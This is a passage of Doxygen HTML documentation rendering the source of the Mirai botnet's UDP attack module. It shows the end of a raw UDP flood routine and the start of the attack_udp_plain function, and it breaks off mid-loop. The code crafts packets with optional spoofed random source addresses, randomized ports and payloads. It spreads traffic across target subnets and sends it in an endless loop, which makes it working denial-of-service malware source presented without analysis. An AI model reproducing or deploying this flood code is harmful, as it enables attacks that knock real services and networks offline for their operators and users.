class="line"><a name="l00064"></a><span class="lineno">   64</span>&#160;        pkts[i] = calloc(1510, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span>));</div><div class="line"><a name="l00065"></a><span class="lineno">   65</span>&#160;        iph = (<span class="keyword">struct </span>iphdr *)pkts[i];</div><div class="line"><a name="l00066"></a><span class="lineno">   66</span>&#160;        udph = (<span class="keyword">struct </span>udphdr *)(iph + 1);</div><div class="line"><a name="l00067"></a><span class="lineno">   67</span>&#160;</div><div class="line"><a name="l00068"></a><span class="lineno">   68</span>&#160;        iph-&gt;version = 4;</div><div class="line"><a name="l00069"></a><span class="lineno">   69</span>&#160;        iph-&gt;ihl = 5;</div><div class="line"><a name="l00070"></a><span class="lineno">   70</span>&#160;        iph-&gt;tos = ip_tos;</div><div class="line"><a name="l00071"></a><span class="lineno">   71</span>&#160;        iph-&gt;tot_len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + data_len);</div><div class="line"><a name="l00072"></a><span class="lineno">   72</span>&#160;        iph-&gt;id = htons(ip_ident);</div><div class="line"><a name="l00073"></a><span class="lineno">   73</span>&#160;        iph-&gt;ttl = ip_ttl;</div><div class="line"><a name="l00074"></a><span class="lineno">   74</span>&#160;        <span class="keywordflow">if</span> (dont_frag)</div><div class="line"><a name="l00075"></a><span class="lineno">   75</span>&#160;            iph-&gt;frag_off = htons(1 &lt;&lt; 14);</div><div class="line"><a name="l00076"></a><span class="lineno">   76</span>&#160;        iph-&gt;protocol = IPPROTO_UDP;</div><div class="line"><a name="l00077"></a><span class="lineno">   77</span>&#160;        iph-&gt;saddr = source_ip;</div><div class="line"><a name="l00078"></a><span class="lineno">   78</span>&#160;        iph-&gt;daddr = targs[i].addr;</div><div class="line"><a name="l00079"></a><span class="lineno">   79</span>&#160;</div><div class="line"><a name="l00080"></a><span class="lineno">   80</span>&#160;        udph-&gt;source = htons(sport);</div><div class="line"><a name="l00081"></a><span class="lineno">   81</span>&#160;        udph-&gt;dest = htons(dport);</div><div class="line"><a name="l00082"></a><span class="lineno">   82</span>&#160;        udph-&gt;len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + data_len);</div><div class="line"><a name="l00083"></a><span class="lineno">   83</span>&#160;    }</div><div class="line"><a name="l00084"></a><span class="lineno">   84</span>&#160;</div><div class="line"><a name="l00085"></a><span class="lineno">   85</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00086"></a><span class="lineno">   86</span>&#160;    {</div><div class="line"><a name="l00087"></a><span class="lineno">   87</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00088"></a><span class="lineno">   88</span>&#160;        {</div><div class="line"><a name="l00089"></a><span class="lineno">   89</span>&#160;            <span class="keywordtype">char</span> *pkt = pkts[i];</div><div class="line"><a name="l00090"></a><span class="lineno">   90</span>&#160;            <span class="keyword">struct </span>iphdr *iph = (<span class="keyword">struct </span>iphdr *)pkt;</div><div class="line"><a name="l00091"></a><span class="lineno">   91</span>&#160;            <span class="keyword">struct </span>udphdr *udph = (<span class="keyword">struct </span>udphdr *)(iph + 1);</div><div class="line"><a name="l00092"></a><span class="lineno">   92</span>&#160;            <span class="keywordtype">char</span> *data = (<span class="keywordtype">char</span> *)(udph + 1);</div><div class="line"><a name="l00093"></a><span class="lineno">   93</span>&#160;</div><div class="line"><a name="l00094"></a><span class="lineno">   94</span>&#160;            <span class="comment">// For prefix attacks</span></div><div class="line"><a name="l00095"></a><span class="lineno">   95</span>&#160;            <span class="keywordflow">if</span> (targs[i].netmask &lt; 32)</div><div class="line"><a name="l00096"></a><span class="lineno">   96</span>&#160;                iph-&gt;daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>()) &gt;&gt; targs[i].netmask));</div><div class="line"><a name="l00097"></a><span class="lineno">   97</span>&#160;</div><div class="line"><a name="l00098"></a><span class="lineno">   98</span>&#160;            <span class="keywordflow">if</span> (source_ip == 0xffffffff)</div><div class="line"><a name="l00099"></a><span class="lineno">   99</span>&#160;                iph-&gt;saddr = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00100"></a><span class="lineno">  100</span>&#160;</div><div class="line"><a name="l00101"></a><span class="lineno">  101</span>&#160;            <span class="keywordflow">if</span> (ip_ident == 0xffff)</div><div class="line"><a name="l00102"></a><span class="lineno">  102</span>&#160;                iph-&gt;id = (uint16_t)<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00103"></a><span class="lineno">  103</span>&#160;            <span class="keywordflow">if</span> (sport == 0xffff)</div><div class="line"><a name="l00104"></a><span class="lineno">  104</span>&#160;                udph-&gt;source = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00105"></a><span class="lineno">  105</span>&#160;            <span class="keywordflow">if</span> (dport == 0xffff)</div><div class="line"><a name="l00106"></a><span class="lineno">  106</span>&#160;                udph-&gt;dest = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00107"></a><span class="lineno">  107</span>&#160;</div><div class="line"><a name="l00108"></a><span class="lineno">  108</span>&#160;            <span class="comment">// Randomize packet content?</span></div><div class="line"><a name="l00109"></a><span class="lineno">  109</span>&#160;            <span class="keywordflow">if</span> (data_rand)</div><div class="line"><a name="l00110"></a><span class="lineno">  110</span>&#160;                <a class="code" href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a>(data, data_len);</div><div class="line"><a name="l00111"></a><span class="lineno">  111</span>&#160;</div><div class="line"><a name="l00112"></a><span class="lineno">  112</span>&#160;            iph-&gt;check = 0;</div><div class="line"><a name="l00113"></a><span class="lineno">  113</span>&#160;            iph-&gt;check = <a class="code" href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a>((uint16_t *)iph, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr));</div><div class="line"><a name="l00114"></a><span class="lineno">  114</span>&#160;</div><div class="line"><a name="l00115"></a><span class="lineno">  115</span>&#160;            udph-&gt;check = 0;</div><div class="line"><a name="l00116"></a><span class="lineno">  116</span>&#160;            udph-&gt;check = <a class="code" href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a>(iph, udph, udph-&gt;len, sizeof (<span class="keyword">struct</span> udphdr) + data_len);</div><div class="line"><a name="l00117"></a><span class="lineno">  117</span>&#160;</div><div class="line"><a name="l00118"></a><span class="lineno">  118</span>&#160;            targs[i].sock_addr.sin_port = udph-&gt;dest;</div><div class="line"><a name="l00119"></a><span class="lineno">  119</span>&#160;            sendto(fd, pkt, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> udphdr) + data_len, MSG_NOSIGNAL, (<span class="keyword">struct</span> sockaddr *)&amp;targs[i].sock_addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00120"></a><span class="lineno">  120</span>&#160;        }</div><div class="line"><a name="l00121"></a><span class="lineno">  121</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00122"></a><span class="lineno">  122</span>&#160;            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00123"></a><span class="lineno">  123</span>&#160;            <span class="keywordflow">if</span> (errno != 0)</div><div class="line"><a name="l00124"></a><span class="lineno">  124</span>&#160;                printf(<span class="stringliteral">&quot;errno = %d\n&quot;</span>, errno);</div><div class="line"><a name="l00125"></a><span class="lineno">  125</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00126"></a><span class="lineno">  126</span>&#160;    }</div><div class="line"><a name="l00127"></a><span class="lineno">  127</span>&#160;}</div><div class="ttc" id="loader_2src_2headers_2includes_8h_html_adccb5337cf206fe3eca7c4732f634bb9"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a></div><div class="ttdeci">uint16_t port_t</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00014">includes.h:14</a></div></div>
<div class="ttc" id="checksum_8c_html_a84522f5e663ea711a5ceafdf03e586ea"><div class="ttname"><a href="checksum_8c.html#a84522f5e663ea711a5ceafdf03e586ea">checksum_generic</a></div><div class="ttdeci">uint16_t checksum_generic(uint16_t *addr, uint32_t count)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00009">checksum.c:9</a></div></div>
<div class="ttc" id="wget_8c_html_aa8318fbee111c5bde5952c63e894c962"><div class="ttname"><a href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a></div><div class="ttdeci">#define socket</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00047">wget.c:47</a></div></div>
<div class="ttc" id="wget_8c_html_a9c7f6d5331abb2692a876d5ee67474b7"><div class="ttname"><a href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a></div><div class="ttdeci">#define close</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00052">wget.c:52</a></div></div>
<div class="ttc" id="structdnshdr_html_acfe83574de35456f80abcbc7d0fe8472"><div class="ttname"><a href="structdnshdr.html#acfe83574de35456f80abcbc7d0fe8472">dnshdr::opts</a></div><div class="ttdeci">uint16_t opts</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00008">protocol.h:8</a></div></div>
<div class="ttc" id="attack_8h_html_acfa2ed8a557040aed04b6c9346aa0eb9"><div class="ttname"><a href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a></div><div class="ttdeci">#define ATK_OPT_IP_TTL</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00050">attack.h:50</a></div></div>
<div class="ttc" id="mirai_2bot_2includes_8h_html_aecb64c7238a325af454cf5e17d933ff2"><div class="ttname"><a href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a></div><div class="ttdeci">ipv4_t LOCAL_ADDR</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2includes_8h_source.html#l00031">includes.h:31</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa8cecfc5c5c054d2875c03e77b7be15d"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a></div><div class="ttdeci">#define TRUE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00010">includes.h:10</a></div></div>
<div class="ttc" id="rand_8c_html_a11c986f4ca9d396a9bc68c0dd4b3903f"><div class="ttname"><a href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a></div><div class="ttdeci">void rand_str(char *str, int len)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00032">rand.c:32</a></div></div>
<div class="ttc" id="checksum_8c_html_a5144ab59500e01ed196ae6d8b4584c98"><div class="ttname"><a href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a></div><div class="ttdeci">uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00024">checksum.c:24</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_af492d2bddcb2befacb3aa03dcdf9aafd"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a></div><div class="ttdeci">char BOOL</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00011">includes.h:11</a></div></div>
<div class="ttc" id="rand_8c_html_accf5c4faf4fb7eb9d74bbf1764921b00"><div class="ttname"><a href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a></div><div class="ttdeci">uint32_t rand_next(void)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00021">rand.c:21</a></div></div>
<div class="ttc" id="attack_8h_html_a4d0115976f56267c42e6a09ff3651c02"><div class="ttname"><a href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a></div><div class="ttdeci">#define ATK_OPT_SPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00052">attack.h:52</a></div></div>
<div class="ttc" id="attack_8h_html_ac8d9ef7cc50e5b0e43f50b087c4c7104"><div class="ttname"><a href="attack_8h.html#ac8d9ef7cc50e5b0e43f50b087c4c7104">ATK_OPT_PAYLOAD_RAND</a></div><div class="ttdeci">#define ATK_OPT_PAYLOAD_RAND</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00047">attack.h:47</a></div></div>
<div class="ttc" id="attack_8h_html_a9b14feb6720fefac0c6da63a77da718e"><div class="ttname"><a href="attack_8h.html#a9b14feb6720fefac0c6da63a77da718e">ATK_OPT_SOURCE</a></div><div class="ttdeci">#define ATK_OPT_SOURCE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00071">attack.h:71</a></div></div>
<div class="ttc" id="attack_8h_html_a57162ecbd3f7644a8f6a6b58aa4f8596"><div class="ttname"><a href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a></div><div class="ttdeci">#define ATK_OPT_IP_DF</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00051">attack.h:51</a></div></div>
<div class="ttc" id="attack_8h_html_a1ac4210e00c74506c31642a74e3fc1c7"><div class="ttname"><a href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a></div><div class="ttdeci">#define ATK_OPT_IP_TOS</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00048">attack.h:48</a></div></div>
<div class="ttc" id="attack_8h_html_aacac129514ea3914af56b5eb4c71f8c6"><div class="ttname"><a href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a></div><div class="ttdeci">#define ATK_OPT_PAYLOAD_SIZE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00046">attack.h:46</a></div></div>
<div class="ttc" id="attack_8c_html_ab59e5bf31f63eeb001f8ec1278a15907"><div class="ttname"><a href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a></div><div class="ttdeci">int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00206">attack.c:206</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa93f0eb578d23995850d61f7d61c55c1"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a></div><div class="ttdeci">#define FALSE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00009">includes.h:9</a></div></div>
<div class="ttc" id="attack_8h_html_ab8471c4c3e703d3c9ee4e971c48ba5fb"><div class="ttname"><a href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a></div><div class="ttdeci">#define ATK_OPT_DPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00053">attack.h:53</a></div></div>
<div class="ttc" id="attack_8h_html_aecb175215ca3d0ce5017cd8cedb7e0fe"><div class="ttname"><a href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a></div><div class="ttdeci">#define ATK_OPT_IP_IDENT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00049">attack.h:49</a></div></div>
<div class="ttc" id="protocol_8h_html_ad1a572736a10ff6b282c5f43c4ea1ccf"><div class="ttname"><a href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a></div><div class="ttdeci">uint16_t data_len</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00483">protocol.h:483</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="a02ff8d6a614d729c46bae7cd348e511e"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_udp_plain </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__target.html">attack_target</a> *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack__udp_8c_source.html#l00375">375</a> of file <a class="el" href="attack__udp_8c_source.html">attack_udp.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00053">ATK_OPT_DPORT</a>, <a class="el" href="attack_8h_source.html#l00047">ATK_OPT_PAYLOAD_RAND</a>, <a class="el" href="attack_8h_source.html#l00046">ATK_OPT_PAYLOAD_SIZE</a>, <a class="el" href="attack_8h_source.html#l00052">ATK_OPT_SPORT</a>, <a class="el" href="attack_8c_source.html#l00206">attack_get_opt_int()</a>, <a class="el" href="ForumPost_8txt_source.html#l00001">connect</a>, <a class="el" href="protocol_8h_source.html#l00483">data_len</a>, <a class="el" href="rand_8c_source.html#l00021">rand_next()</a>, <a class="el" href="rand_8c_source.html#l00032">rand_str()</a>, <a class="el" href="attack_8h_source.html#l00021">attack_target::sock_addr</a>, <a class="el" href="wget_8c_source.html#l00047">socket</a>, and <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00010">TRUE</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>
<div class="fragment"><div class="line"><a name="l00376"></a><span class="lineno">  376</span>&#160;{</div><div class="line"><a name="l00377"></a><span class="lineno">  377</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00378"></a><span class="lineno">  378</span>&#160;    printf(<span class="stringliteral">&quot;in udp plain\n&quot;</span>);</div><div class="line"><a name="l00379"></a><span class="lineno">  379</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00380"></a><span class="lineno">  380</span>&#160;</div><div class="line"><a name="l00381"></a><span class="lineno">  381</span>&#160;    <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00382"></a><span class="lineno">  382</span>&#160;    <span class="keywordtype">char</span> **pkts = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span> *));</div><div class="line"><a name="l00383"></a><span class="lineno">  383</span>&#160;    <span class="keywordtype">int</span> *fds = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keywordtype">int</span>));</div><div class="line"><a name="l00384"></a><span class="lineno">  384</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> dport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a>, 0xffff);</div><div class="line"><a name="l00385"></a><span class="lineno">  385</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> sport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a>, 0xffff);</div><div class="line"><a name="l00386"></a><span class="lineno">  386</span>&#160;    uint16_t <a class="code" href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a> = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a>, 512);</div><div class="line"><a name="l00387"></a><span class="lineno">  387</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> data_rand = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ac8d9ef7cc50e5b0e43f50b087c4c7104">ATK_OPT_PAYLOAD_RAND</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00388"></a><span class="lineno">  388</span>&#160;    <span class="keyword">struct </span>sockaddr_in bind_addr = {0};</div><div class="line"><a name="l00389"></a><span class="lineno">  389</span>&#160;</div><div class="line"><a name="l00390"></a><span class="lineno">  390</span>&#160;    <span class="keywordflow">if</span> (sport == 0xffff)</div><div class="line"><a name="l00391"></a><span class="lineno">  391</span>&#160;    {</div><div class="line"><a name="l00392"></a><span class="lineno">  392</span>&#160;        sport = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00393"></a><span class="lineno">  393</span>&#160;    } <span class="keywordflow">else</span> {</div><div class="line"><a name="l00394"></a><span class="lineno">  394</span>&#160;        sport = htons(sport);</div><div class="line"><a name="l00395"></a><span class="lineno">  395</span>&#160;    }</div><div class="line"><a name="l00396"></a><span class="lineno">  396</span>&#160;</div><div class="line"><a name="l00397"></a><span class="lineno">  397</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00398"></a><span class="lineno">  398</span>&#160;    printf(<span class="stringliteral">&quot;after args\n&quot;</span>);</div><div class="line"><a name="l00399"></a><span class="lineno">  399</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00400"></a><span class="lineno">  400</span>&#160;</div><div class="line"><a name="l00401"></a><span class="lineno">  401</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00402"></a><span class="lineno">  402</span>&#160;    {</div><div class="line"><a name="l00403"></a><span class="lineno">  403</span>&#160;        <span class="keyword">struct </span>iphdr *iph;</div><div class="line"><a name="l00404"></a><span class="lineno">  404</span>&#160;        <span class="keyword">struct </span>udphdr *udph;</div><div class="line"><a name="l00405"></a><span class="lineno">  405</span>&#160;        <span class="keywordtype">char</span> *data;</div><div class="line"><a name="l00406"></a><span class="lineno">  406</span>&#160;</div><div class="line"><a name="l00407"></a><span class="lineno">  407</span>&#160;        pkts[i] = calloc(65535, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span>));</div><div class="line"><a name="l00408"></a><span class="lineno">  408</span>&#160;</div><div class="line"><a name="l00409"></a><span class="lineno">  409</span>&#160;        <span class="keywordflow">if</span> (dport == 0xffff)</div><div class="line"><a name="l00410"></a><span class="lineno">  410</span>&#160;            targs[i].sock_addr.sin_port = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00411"></a><span class="lineno">  411</span>&#160;        <span class="keywordflow">else</span></div><div class="line"><a name="l00412"></a><span class="lineno">  412</span>&#160;            targs[i].sock_addr.sin_port = htons(dport);</div><div class="line"><a name="l00413"></a><span class="lineno">  413</span>&#160;</div><div class="line"><a name="l00414"></a><span class="lineno">  414</span>&#160;        <span class="keywordflow">if</span> ((fds[i] = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)</div><div class="line"><a name="l00415"></a><span class="lineno">  415</span>&#160;        {</div><div class="line"><a name="l00416"></a><span class="lineno">  416</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00417"></a><span class="lineno">  417</span>&#160;            printf(<span class="stringliteral">&quot;Failed to create udp socket. Aborting attack\n&quot;</span>);</div><div class="line"><a name="l00418"></a><span class="lineno">  418</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00419"></a><span class="lineno">  419</span>&#160;            <span class="keywordflow">return</span>;</div><div class="line"><a name="l00420"></a><span class="lineno">  420</span>&#160;        }</div><div class="line"><a name="l00421"></a><span class="lineno">  421</span>&#160;</div><div class="line"><a name="l00422"></a><span class="lineno">  422</span>&#160;        bind_addr.sin_family = AF_INET;</div><div class="line"><a name="l00423"></a><span class="lineno">  423</span>&#160;        bind_addr.sin_port = sport;</div><div class="line"><a name="l00424"></a><span class="lineno">  424</span>&#160;        bind_addr.sin_addr.s_addr = 0;</div><div class="line"><a name="l00425"></a><span class="lineno">  425</span>&#160;</div><div class="line"><a name="l00426"></a><span class="lineno">  426</span>&#160;        <span class="keywordflow">if</span> (bind(fds[i], (<span class="keyword">struct</span> sockaddr *)&amp;bind_addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in)) == -1)</div><div class="line"><a name="l00427"></a><span class="lineno">  427</span>&#160;        {</div><div class="line"><a name="l00428"></a><span class="lineno">  428</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00429"></a><span class="lineno">  429</span>&#160;            printf(<span class="stringliteral">&quot;Failed to bind udp socket.\n&quot;</span>);</div><div class="line"><a name="l00430"></a><span class="lineno">  430</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00431"></a><span class="lineno">  431</span>&#160;        }</div><div class="line"><a name="l00432"></a><span class="lineno">  432</span>&#160;</div><div class="line"><a name="l00433"></a><span class="lineno">  433</span>&#160;        <span class="comment">// For prefix attacks</span></div><div class="line"><a name="l00434"></a><span class="lineno">  434</span>&#160;        <span class="keywordflow">if</span> (targs[i].netmask &lt; 32)</div><div class="line"><a name="l00435"></a><span class="lineno">  435</span>&#160;            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>()) &gt;&gt; targs[i].netmask));</div><div class="line"><a name="l00436"></a><span class="lineno">  436</span>&#160;</div><div class="line"><a name="l00437"></a><span class="lineno">  437</span>&#160;        <span class="keywordflow">if</span> (<a class="code" href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a>(fds[i], (<span class="keyword">struct</span> sockaddr *)&amp;targs[i].sock_addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in)) == -1)</div><div class="line"><a name="l00438"></a><span class="lineno">  438</span>&#160;        {</div><div class="line"><a name="l00439"></a><span class="lineno">  439</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00440"></a><span class="lineno">  440</span>&#160;            printf(<span class="stringliteral">&quot;Failed to connect udp socket.\n&quot;</span>);</div><div class="line"><a name="l00441"></a><span class="lineno">  441</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00442"></a><span class="lineno">  442</span>&#160;        }</div><div class="line"><a name="l00443"></a><span class="lineno">  443</span>&#160;    }</div><div class="line"><a name="l00444"></a><span class="lineno">  444</span>&#160;</div><div class="line"><a name="l00445"></a><span class="lineno">  445</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00446"></a><span class="lineno">  446</span>&#160;    printf(<span class="stringliteral">&quot;after setup\n&quot;</span>);</div><div class="line"><a name="l00447"></a><span class="lineno">  447</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00448"></a><span class="lineno">  448</span>&#160;</div><div class="line"><a name="l00449"></a><span class="lineno">  449</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00450"></a><span class="lineno">  450</span>&#160;    {</div><div class="line"><a name="l00451"></a><span class="lineno">  451</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00452"></a><span class="lineno">  452</span>&#160;        {</div><div class="line"><a name="l00453"></a><span class="lineno">  453</span>&#160;            <span class="keywordtype">char</span> *data = pkts[i];</div><div class="line"><a name="l00454"></a><span class="lineno">  454</span>&#160;</div><div class="line"><a name="l00455"></a><span class="lineno">  455</span>&#160;            <span class="comment">// Randomize packet content?</span></div><div class="line"><a name="l00456"></a><span class="lineno">  456</span>&#160;            <span class="keywordflow">if</span> (data_rand)</div><div class="line"><a name="l00457"></a><span class="lineno">  457</span>&#160;                <a class="code" href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a>(data, data_len);</div><div class="line"><a name="l00458"></a><span class="lineno">  458</span>&#160;</div><div class="line"><a name="l00459"></a><span class="lineno">  